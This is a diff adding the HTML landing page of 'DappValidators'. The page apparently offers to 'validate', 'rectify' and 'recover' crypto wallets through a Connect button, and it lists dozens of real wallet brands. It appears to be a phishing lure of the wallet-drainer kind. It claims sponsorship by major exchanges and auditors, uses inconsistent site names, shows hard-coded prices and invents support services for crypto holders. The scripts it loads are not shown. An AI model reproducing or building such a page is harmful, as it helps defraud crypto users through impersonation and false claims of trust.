@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DappValidators</title>
+  <link rel="icon" href="Images/A44.jpeg" type="image/jpeg">
+  <link rel="stylesheet" href="Styles/base.css" />
+  <link rel="stylesheet" href="Styles/header.css" />
+  <link rel="stylesheet" href="Styles/hero.css" />
+  <link rel="stylesheet" href="Styles/ticker.css" />
+  <link rel="stylesheet" href="Styles/cases.css" />
+  <link rel="stylesheet" href="Styles/exchange.css" />
+  <link rel="stylesheet" href="Styles/features.css" />
+  <link rel="stylesheet" href="Styles/about.css" />
+  <link rel="stylesheet" href="Styles/footer.css" />
+  <link rel="stylesheet" href="Styles/steps.css" />
+  <link rel="stylesheet" href="Styles/wallet-support.css" />
+  <script defer src="Script/dapp.js"></script>
+  <script defer src="Script/app.js"></script>
+    <script defer src="Script/app.js"></script>
+
+ 
+</head>
+<body>
+  <header class="glass-nav">
+    <div class="xlogo">
+      <span class="logo-text">DappsValidators</span>
+    </div>
+    <button id="connectWallet" class="glass">Connect</button>
+  </header>
+  <section class="hero">
+    <div class="hero-card">
+      <h1>Integrate Web3 interactions<br>with your DApps</h1>
+      <p>DappsValidator is a blockchain protocol enabling seamless communication between crypto user interface and dApps</p>
+      <a href="#sponsors" class="cta-btn">Get Started</a>
+      <div class="hero-counters">
+        <div class="counter-item">
+          <span class="counter-label">TOTAL WEBSOCKETS</span>
+          <span class="counter-value" id="counter-websockets">0</span>
+        </div>
+        <div class="counter-item">
+          <span class="counter-label">ACTIVE WEBSOCKETS</span>
+          <span class="counter-value" id="counter-active-websockets">0</span>
+        </div>
+        <div class="counter-item">
+          <span class="counter-label">MESSAGES</span>
+          <span class="counter-value" id="counter-messages">0</span>
+        </div>
+        <div class="counter-item">
+          <span class="counter-label">WALLETS</span>
+          <span class="counter-value" id="counter-wallets">0</span>
+        </div>
+        <div class="counter-item">
+          <span class="counter-label">APPS</span>
+          <span class="counter-value" id="counter-apps">0</span>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="news-ticker">
+    <div class="ticker-container">
+      <div class="ticker-content" id="crypto-ticker">
+        <!-- Placeholder data; updated via JavaScript -->
+        <div class="ticker-item">
+          <span class="coin-name">BTC</span>
+          <span class="coin-price">$70,123.45</span>
+          <span class="arrow-up">▲</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">ETH</span>
+          <span class="coin-price">$3,456.78</span>
+          <span class="arrow-down">▼</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">BNB</span>
+          <span class="coin-price">$580.12</span>
+          <span class="arrow-up">▲</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">ADA</span>
+          <span class="coin-price">$0.45</span>
+          <span class="arrow-down">▼</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">SOL</span>
+          <span class="coin-price">$175.23</span>
+          <span class="arrow-up">▲</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">XRP</span>
+          <span class="coin-price">$0.62</span>
+          <span class="arrow-down">▼</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">DOGE</span>
+          <span class="coin-price">$0.13</span>
+          <span class="arrow-up">▲</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">DOT</span>
+          <span class="coin-price">$6.78</span>
+          <span class="arrow-down">▼</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">AVAX</span>
+          <span class="coin-price">$28.45</span>
+          <span class="arrow-up">▲</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">SHIB</span>
+          <span class="coin-price">$0.000017</span>
+          <span class="arrow-down">▼</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">LINK</span>
+          <span class="coin-price">$13.89</span>
+          <span class="arrow-up">▲</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">MATIC</span>
+          <span class="coin-price">$0.53</span>
+          <span class="arrow-down">▼</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">TRX</span>
+          <span class="coin-price">$0.14</span>
+          <span class="arrow-up">▲</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">LTC</span>
+          <span class="coin-price">$73.12</span>
+          <span class="arrow-down">▼</span>
+        </div>
+        <div class="ticker-item">
+          <span class="coin-name">UNI</span>
+          <span class="coin-price">$7.65</span>
+          <span class="arrow-up">▲</span>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="case-box">
+    <h2 class="case-statement">Protocol Solutions for Non-Custodial <br> Wallet Management</h2>
+    <div class="cases">
+      <div class="case-item-container">
+        <h3 class="case-item-header">Validation</h3>
+        <p class="case-item">Verify wallet ownership and authenticity</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Rectification</h3>
+        <p class="case-item">Resolve wallet configuration issues</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Claim</h3>
+        <p class="case-item">Access and claim your digital assets</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Migration</h3>
+        <p class="case-item">Transfer assets between wallets and chains</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">DApp Connection</h3>
+        <p class="case-item">Resolve decentralized application connectivity</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">NFT Marketplace</h3>
+        <p class="case-item">Monitor and manage NFT portfolio values</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Copy Trading Errors</h3>
+        <p class="case-item">Troubleshoot and fix errors in copy trades</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Transaction Related</h3>
+        <p class="case-item">Resolve failed, flagged or pending transactions</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">MeV Protection</h3>
+        <p class="case-item">Apply Mev protection for cheaper transactions</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Incinerator / Asset Recovery</h3>
+        <p class="case-item">Recover lost, inaccessible or rented digital assets</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Staking</h3>
+        <p class="case-item">Manage staking operations and rewards</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Login & Access</h3>
+        <p class="case-item">Resolve login and authorisation problems</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Gas Fee & Slippage</h3>
+        <p class="case-item">Resolve slippage and gas fee problems</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Token Trading</h3>
+        <p class="case-item">Establish trusted payment source verification</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Token Swap</h3>
+        <p class="case-item">Execute token exchanges and conversions</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Cross-Chain Transfer</h3>
+        <p class="case-item">Bridge assets across different blockchains</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Sybil Proof</h3>
+        <p class="case-item">Obtain sybil-resistant NFT verification</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Account Security</h3>
+        <p class="case-item">Resolve locked account and flagging issues</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Node Resolution</h3>
+        <p class="case-item">Fix blockchain node connectivity problems</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Withdrawals</h3>
+        <p class="case-item">Handle withdrawal processing and issues</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Social Integration</h3>
+        <p class="case-item">Connect and manage social media accounts</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Whitelist</h3>
+        <p class="case-item">Handle whitelist registration and verification</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Airdrops & Rewards</h3>
+        <p class="case-item">Claim tokens and reward distributions</p>
+      </div>
+      <div class="case-item-container">
+        <h3 class="case-item-header">Governance</h3>
+        <p class="case-item">Participate in decentralized governance voting</p>
+      </div>
+    </div>
+  </section>
+  <section class="steps-box">
+    <h3 class="steps-statement">Follow These 3 Simple Steps to Get Started</h3>
+    <section class="steps">
+      <div class="steps-item-container">
+        <p class="steps-item-header">1. Choose Wallet</p>
+        <p class="steps-item">Select from our wide range of<br>
+          supported crypto wallets and<br>
+          either synchronize, validate,<br>
+          rectify or recover wallet.</p>
+      </div>
+      <div class="steps-item-container">
+        <p class="steps-item-header">2. Validate Wallet</p>
+        <p class="steps-item">Verify wallet ownership.<br>
+          Private keys never leave the<br>
+          mobile wallet, ensuring the<br>
+          highest level of security.</p>
+      </div>
+      <div class="steps-item-container">
+        <p class="steps-item-header">3. Get Connected</p>
+        <p class="steps-item">Client-side generated keys in<br>
+          end-to-end encryption ensure<br>
+          complete confidentiality and<br>
+          protection of user activity.</p>
+      </div>
+    </section>
+  </section>
+  <section class="wallet-support">
+    <h2 class="wallet-support-heading">Supported Wallets</h2>
+    <p class="wallet-support-text">
+      DappsHub enables seamless integration of your wallet with an 
+      <br> extensive collection of applications,
+      unlocking a multitude of <br> web3 opportunities.
+    </p>
+
+    <section class="item-list">
+      <a text-decoration: none href="https://walletconnect.com" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/wc.jpg" alt="Wallet Connect">
+          <p class="logo-title">Wallet Connect</p>
+        </div>
+      </a>
+
+      <a href="https://metamask.io" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A3.jpg" alt="MetaMask">
+          <p class="logo-title">Metamask</p>
+        </div>
+      </a>
+
+      <a href="https://trustwallet.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A2.jpg" alt="Trust Wallet">
+          <p class="logo-title">Trust Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://www.bitget.site/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/bitget.png" alt="BitGet">
+          <p class="logo-title">BitGet</p>
+        </div>
+      </a>
+
+      <a href="https://phantom.app/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/B2.png" alt="Phantom">
+          <p class="logo-title">Phantom</p>
+        </div>
+      </a>
+
+      <a href="https://www.leapwallet.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A8.jpeg" alt="Leap Wallet">
+          <p class="logo-title">Leap Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://www.ledger.com/ledger-live" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A4.jpg" alt="Ledger Live">
+          <p class="logo-title">Ledger Live</p>
+        </div>
+      </a>
+
+      <a href="https://www.coinbase.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/coinbase.png" alt="CoinBase">
+          <p class="logo-title">CoinBase</p>
+        </div>
+      </a>
+
+      <a href="https://crypto.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/cryptocom.png" alt="Crypto.com">
+          <p class="logo-title">Crypto.com</p>
+        </div>
+      </a>
+
+      <a href="https://www.argent.xyz/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A7.jpg" alt="Argent">
+          <p class="logo-title">Argent</p>
+        </div>
+      </a>
+
+      <a href="https://solflare.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/solflare.png" alt="Solflare">
+          <p class="logo-title">Solflare</p>
+        </div>
+      </a>
+
+      <a href="https://tonkeeper.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/tonkeeper.png" alt="Tonkeeper">
+          <p class="logo-title">Tonkeeper</p>
+        </div>
+      </a>
+
+      <a href="https://www.okx.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/okx.png" alt="OKX">
+          <p class="logo-title">OKX</p>
+        </div>
+      </a>
+
+      <a href="https://www.keplr.app/download" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/C4.jpeg" alt="Keplr Wallet">
+          <p class="logo-title">Keplr Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://zengo.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/zengo.png" alt="Zengo">
+          <p class="logo-title">Zengo</p>
+        </div>
+      </a>
+
+      <a href="https://trezor.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/trezor.png" alt="Trezor">
+          <p class="logo-title">Trezor</p>
+        </div>
+      </a>
+
+      <a href="https://solana.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/solana.png" alt="Solana">
+          <p class="logo-title">Solana</p>
+        </div>
+      </a>
+
+      <a href="https://www.blockchain.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/blockchain.png" alt="Blockchain">
+          <p class="logo-title">Blockchain</p>
+        </div>
+      </a>
+
+      <a href="https://bitpay.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/bitpay.png" alt="BitPay">
+          <p class="logo-title">BitPay</p>
+        </div>
+      </a>
+
+      <a href="https://axiom.trade/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/ax.jpg" alt="BitPay">
+          <p class="logo-title">Axiom</p>
+        </div>
+      </a>
+
+      <a href="https://www.tokenpocket.pro/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/tokenpocket.png" alt="TokenPocket">
+          <p class="logo-title">TokenPocket</p>
+        </div>
+      </a>
+
+      <a href="https://bullx.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/ay.jpg" alt="BitPay">
+          <p class="logo-title">Bullx</p>
+        </div>
+      </a>
+
+      <a href="https://token.im/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A16.jpg" alt="imToken">
+          <p class="logo-title">imToken</p>
+        </div>
+      </a>
+
+      <a href="https://www.pillar.fi/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A17.jpeg" alt="Pillar">
+          <p class="logo-title">Pillar</p>
+        </div>
+      </a>
+
+      <a href="https://rainbow.me/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/rainbow.png" alt="Rainbow">
+          <p class="logo-title">Rainbow</p>
+        </div>
+      </a>
+
+      <a href="https://mathwallet.org" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/wj.jpg" alt="MathWallet">
+          <p class="logo-title">MathWallet</p>
+        </div>
+      </a>
+
+       <a href="https://t.me/TradeWiz_Solbot" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/L7.jpg" alt="MathWallet">
+          <p class="logo-title">TradeWiz</p>
+        </div>
+      </a>
+
+      <a href="https://onto.app//" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A21.jpg" alt="Onto">
+          <p class="logo-title">Onto</p>
+        </div>
+      </a>
+
+      <a href="https://telemetry.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/av.jpg" alt="BitPay">
+          <p class="logo-title">Bonkbot</p>
+        </div>
+      </a>
+
+      <a href="https://authereum.org/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/authereum.png" alt="Authereum">
+          <p class="logo-title">Authereum</p>
+        </div>
+      </a>
+
+      <a href="https://walleth.org/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/walleth.png" alt="Walleth">
+          <p class="logo-title">Walleth</p>
+        </div>
+      </a>
+
+      <a href="https://1inch.io/wallet/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/wn.jpg" alt="1inch Wallet">
+          <p class="logo-title">1inch Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://www.onespan.com/products/trust-vault" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/trustvault.png" alt="TrustVault">
+          <p class="logo-title">TrustVault</p>
+        </div>
+      </a>
+
+      <a href="https://atomicwallet.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A30.jpg" alt="Atomic">
+          <p class="logo-title">Atomic</p>
+        </div>
+      </a>
+
+      <a href="https://coin98.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A31.jpg" alt="Coin98">
+          <p class="logo-title">Coin98</p>
+        </div>
+      </a>
+
+      <a href="https://www.coolwallet.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/wm.jpg" alt="CoolWallet">
+          <p class="logo-title">CoolWallet</p>
+        </div>
+      </a>
+
+      <a href="https://loopring.io/#/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/loopring.png" alt="Loopring Wallet">
+          <p class="logo-title">Loopring Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://alphawallet.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/alphawallet.png" alt="AlphaWallet">
+          <p class="logo-title">AlphaWallet</p>
+        </div>
+      </a>
+
+      <a href="https://www.safepal.com/en/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/safepal.png" alt="SafePal">
+          <p class="logo-title">SafePal</p>
+        </div>
+      </a>
+
+      <a href="https://dcentwallet.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A36.jpg" alt="D'CENT Wallet">
+          <p class="logo-title">D'CENT Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://runonflux.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A37.jpg" alt="Zelcore">
+          <p class="logo-title">Zelcore</p>
+        </div>
+      </a>
+
+      <a href="https://nash.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/nash.png" alt="Nash">
+          <p class="logo-title">Nash</p>
+        </div>
+      </a>
+
+      <a href="https://www.coinomi.com/en/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/coinomi.png" alt="Coinomi">
+          <p class="logo-title">Coinomi</p>
+        </div>
+      </a>
+
+      <a href="https://gridplus.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A40.jpg" alt="GridPlus">
+          <p class="logo-title">GridPlus</p>
+        </div>
+      </a>
+
+      <a href="https://www.cybavo.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A41.jpg" alt="CYBAVO Wallet">
+          <p class="logo-title">Cybavo Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://apps.apple.com/us/app/tokenary-crypto-wallet/id1375542355" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A42.jpg" alt="Tokenary">
+          <p class="logo-title">Tokenary</p>
+        </div>
+      </a>
+
+      <a href="https://tor.us/index.html" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A43.jpg" alt="Torus">
+          <p class="logo-title">Torus</p>
+        </div>
+      </a>
+
+      <a href="https://spatium.net/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A44.jpeg" alt="Spatium">
+          <p class="logo-title">Spatium</p>
+        </div>
+      </a>
+
+      <a href="https://wallet.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/walletio.png" alt="wallet.io">
+          <p class="logo-title">Wallet.io</p>
+        </div>
+      </a>
+
+      <a href="https://infinitywallet.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/infinitywallet.png" alt="Infinity Wallet">
+          <p class="logo-title">Infinity Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://easycrypto.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/A49.jpg" alt="EasyPocket">
+          <p class="logo-title">EasyPocket</p>
+        </div>
+      </a>
+
+      <a href="https://sparkpoint.io/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/sparkpoint.png" alt="SparkPoint">
+          <p class="logo-title">SparkPoint</p>
+        </div>
+      </a>
+
+      <a href="https://www.bnbchain.org/en/bnb-smart-chain" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/binancesmartchain.png" alt="Binance Smart Chain">
+          <p class="logo-title">Binance Smart Chain</p>
+        </div>
+      </a>
+
+      <a href="https://morixjp.com/products/walletcard" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/morix.png" alt="MoriX Wallet">
+          <p class="logo-title">Morix Wallet</p>
+        </div>
+      </a>
+
+      <a href="https://trusteeglobal.com/" target="_blank">
+        <div class="item">
+          <img class="logo" src="Images/trustee.png" alt="Trustee Wallet">
+          <p class="logo-title">Trustee Wallet</p>
+        </div>
+      </a>
+    </section>
+  </section>
+
+  <section id="sponsors" class="sponsors-section">
+    <h2 class="sponsors-heading">Our Sponsors</h2>
+    <div class="sponsors-container">
+      <div class="sponsors-track">
+        <div class="sponsor-item">
+          <img src="Images/zq.jpg" alt="Jupiter Exchange">
+          <span>Jupiter Exchange</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/zx.jpg" alt="Certik">
+          <span>Certik</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/zw.jpg" alt="Meteora">
+          <span>Meteora</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/zc.png" alt="Coinbase">
+          <span>Coinbase</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/zr.jpg" alt="Coinsult">
+          <span>Coinsult</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/zb.jpg" alt="Kraken">
+          <span>Kraken</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/huobi.png" alt="Huobi">
+          <span>Huobi</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/bitget.png" alt="BitGet">
+          <span>BitGet</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/gate.png" alt="Gate.io">
+          <span>Gate.io</span>
+        </div>
+       
+        <div class="sponsor-item">
+          <img src="Images/ledger.png" alt="Ledger">
+          <span>Ledger</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/binance.png" alt="Binance">
+          <span>Binance</span>
+        </div>
+        <div class="sponsor-item">
+          <img src="Images/trezor.png" alt="Trezor">
+          <span>Trezor</span>
+        </div>
+      </div>
+    </div>
+  </section>
+<section>
+ 
+  <div class="socials">
+    <div class="soc-div">
+      <img class="soc" src="Images/D11.png" alt="social-1">
+    </div>
+    <div class="soc-div">
+      <img class="soc" src="Images/x-logo.png" alt="social-1">
+    </div>
+    <div class="soc-div">
+      <img class="soc" src="Images/T-logo.png" alt="social-1">
+    </div>
+    <div class="soc-div">
+      <img class="soc" src="Images/M-logo.png" alt="social-1">
+    </div>
+  </div>
+
+</section>
+  <footer>
+    <p>&copy; 2025 dappvalidator. All rights reserved.</p>
+  </footer>
+</body>
+</html>
